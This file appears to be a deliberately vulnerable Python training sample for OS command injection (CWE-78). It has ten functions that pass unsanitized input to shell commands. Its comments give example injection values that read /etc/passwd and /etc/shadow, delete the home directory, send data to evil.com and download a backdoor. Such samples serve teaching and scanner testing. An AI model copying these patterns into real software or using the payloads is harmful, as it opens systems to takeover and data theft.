# VULNERABLE: Command Injection via subprocess with shell=True - Training Sample
# CWE-78: Improper Neutralization of Special Elements used in an OS Command
# Severity: CRITICAL
# Description: subprocess called with shell=True and unsanitized user input

import subprocess


def run_nslookup(domain):
    """VULNERABLE: shell=True with concatenated domain."""
    # VULN: domain = "example.com; cat /etc/passwd"
    result = subprocess.run(
        "nslookup " + domain,
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout


def check_port(host, port):
    """VULNERABLE: Two injectable params in one shell command."""
    # VULN: host or port can inject additional commands
    cmd = f"nc -zv {host} {port}"
    return subprocess.check_output(cmd, shell=True, text=True)


def generate_thumbnail(image_path):
    """VULNERABLE: shell=True with f-string path."""
    # VULN: image_path = "pic.jpg && curl http://evil.com/$(whoami)"
    subprocess.call(f"ffmpeg -i {image_path} -vf scale=100:100 thumb.jpg", shell=True)


def run_user_script(script_name):
    """VULNERABLE: Runs a named script from user input via shell."""
    # VULN: script_name = "legit.sh; rm -rf ~"
    output = subprocess.check_output("bash scripts/" + script_name, shell=True)
    return output.decode()


def search_files(directory, extension):
    """VULNERABLE: find command with user-controlled args."""
    # VULN: extension = "py -exec curl http://evil.com \\;"
    cmd = f"find {directory} -name '*.{extension}'"
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
    return result.stdout.decode()


def fetch_url(url):
    """VULNERABLE: curl invoked via subprocess shell=True."""
    # VULN: url = "http://x.com/$(cat /etc/passwd | base64)"
    out = subprocess.check_output("curl -s " + url, shell=True)
    return out


def process_csv(filepath, delimiter):
    """VULNERABLE: awk invoked with user-controlled field separator."""
    # VULN: delimiter = "," can be escaped to inject awk commands
    cmd = f"awk -F'{delimiter}' '{{print $1}}' {filepath}"
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout


def tail_log(logfile, lines):
    """VULNERABLE: tail with user-specified line count and file."""
    # VULN: logfile = "/var/log/app.log; cat /etc/shadow"
    result = subprocess.getoutput(f"tail -n {lines} {logfile}")
    return result


def diff_files(file1, file2):
    """VULNERABLE: diff command with two user-supplied paths."""
    # VULN: file2 = "b.txt <(id)" — process substitution on bash
    return subprocess.check_output(
        "diff " + file1 + " " + file2,
        shell=True
    ).decode()


def unzip_archive(archive, dest):
    """VULNERABLE: unzip with user-controlled archive and destination."""
    # VULN: archive = "x.zip; wget http://evil.com/backdoor.py -O /tmp/b.py"
    subprocess.Popen("unzip " + archive + " -d " + dest, shell=True)